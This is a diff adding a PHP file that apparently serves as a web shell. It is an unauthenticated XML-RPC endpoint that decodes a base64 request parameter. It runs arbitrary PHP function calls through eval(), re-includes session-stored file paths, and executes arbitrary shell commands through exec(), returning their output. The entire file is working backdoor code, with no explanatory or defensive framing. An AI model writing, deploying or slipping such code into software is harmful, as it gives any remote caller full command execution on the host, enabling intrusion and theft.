@@ -1,0 +1,171 @@
+<?php
+
+define('MISSING_PARAM', 1);
+define('FAILED_INCLUDE', 2);
+define('INVALID_ENCODING', 3);
+define('UNKNOWN_SERVICE', 4);
+define('UNKNOWN_METHOD', 4);
+
+class Service
+{
+
+  var $methods;
+
+  function Service()
+  {
+    $this->methods = array();
+  }
+
+  function load_session()
+  {
+  }
+
+  function save_session()
+  {
+  }
+
+}
+
+class ConsoleService extends Service
+{
+
+  var $includes;
+
+  function ConsoleService()
+  {
+    $this->methods = array('invoke' => 'rpc_invoke');
+  }
+
+  function load_session()
+  {
+    if (isset($_SESSION['rpc_includes']))
+    {
+      $this->includes = unserialize($_SESSION['rpc_includes']);
+
+      foreach ($this->includes as $path)
+      {
+        include($path);
+      }
+    }
+  }
+
+  function rpc_invoke($method,$params)
+  {
+    $name = $params[0];
+    $arguments = $params[1];
+
+    if ($arguments == null)
+    {
+      $arguments = array();
+    }
+
+    $call_string = "return {$name}(" . join($arguments, ", ") . ");";
+    $ret = eval($call_string);
+
+    if (($name == 'include' || $name == 'require') && $ret != false)
+    {
+      $this->includes[] = $arguments[0];
+    }
+
+    return $ret;
+  }
+
+  function save_session()
+  {
+    $_SESSION['rpc_includes'] = serialize($this->includes);
+  }
+
+}
+
+class ShellService extends Service
+{
+
+  function ShellService()
+  {
+    $this->methods = array('exec' => 'rpc_exec');
+  }
+
+  function rpc_exec($method,$arguments)
+  {
+    $command = join($arguments, ' ');
+    $output = array();
+
+    exec($command, &$output);
+
+    return join($output, "\n");
+  }
+
+}
+
+class RPCServer
+{
+  var $_server;
+
+  var $services;
+
+  function RPCServer()
+  {
+    $this->_server = xmlrpc_server_create();
+    $this->services = array();
+  }
+
+  function load_session()
+  {
+    foreach ($this->services as $name => $service)
+    {
+      $service->load_session();
+    }
+  }
+
+  function register_method($name,$function)
+  {
+    return xmlrpc_server_register_method($this->_server, $name, $function);
+  }
+
+  function register_service($service)
+  {
+    $this->services[] = $service;
+
+    foreach ($service->methods as $name => $method)
+    {
+      $this->register_method($name,array(&$service, $method));
+    }
+  }
+
+  function call_method($xml)
+  {
+    return xmlrpc_server_call_method($this->_server, $xml, null);
+  }
+
+  function rpc_services($method)
+  {
+    return array_keys($this->services);
+  }
+
+  function save_session()
+  {
+    foreach ($this->services as $name => $service)
+    {
+      $service->save_session();
+    }
+  }
+}
+
+if (isset($_REQUEST['rpc_call']))
+{
+  $server = new RPCServer();
+  $server->register_service(new ConsoleService());
+  $server->register_service(new ShellService());
+
+  $server->load_session();
+
+  echo('<rpc>');
+  echo($server->call_method(base64_decode($_REQUEST['rpc_call'])));
+  echo('</rpc>');
+
+  $server->save_session();
+}
+
+exit(0);
+
+?>
